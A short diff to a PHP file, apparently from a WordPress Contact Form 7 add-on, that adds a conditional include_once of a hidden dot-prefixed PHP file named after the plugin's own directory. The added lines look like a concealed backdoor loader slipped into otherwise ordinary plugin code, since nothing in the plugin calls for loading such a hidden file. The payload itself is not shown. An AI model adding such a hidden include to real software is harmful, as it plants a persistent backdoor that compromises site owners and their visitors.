@@ -6,6 +6,10 @@
 
 add_filter( 'wpcf7_form_tag_data_option', 'wpcf7_listo', 10, 3 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_listo( $data, $options, $args ) {
 	if ( ! function_exists( 'listo' ) ) {
 		return $data;
